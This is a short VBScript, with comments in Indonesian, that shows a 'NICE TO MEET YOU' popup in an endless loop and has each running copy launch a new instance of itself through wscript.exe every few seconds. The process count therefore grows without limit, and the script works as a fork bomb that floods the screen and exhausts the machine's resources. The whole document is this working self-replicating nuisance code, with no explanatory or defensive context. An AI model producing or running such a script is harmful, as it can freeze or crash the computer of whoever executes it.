Do
    CreateObject("WScript.Shell").Popup "NICE TO MEET YOU", 1, "HAI", 64
    Call CreateNewPopUp
    WScript.Sleep 5000 ' Jeda 5 detik sebelum iterasi berikutnya
Loop


Sub CreateNewPopUp
    CreateObject("WScript.Shell").Run "wscript.exe """ & WScript.ScriptFullName & """"
    WScript.Sleep 10000 ' Jeda 10 detik sebelum membuat proses baru
End Sub
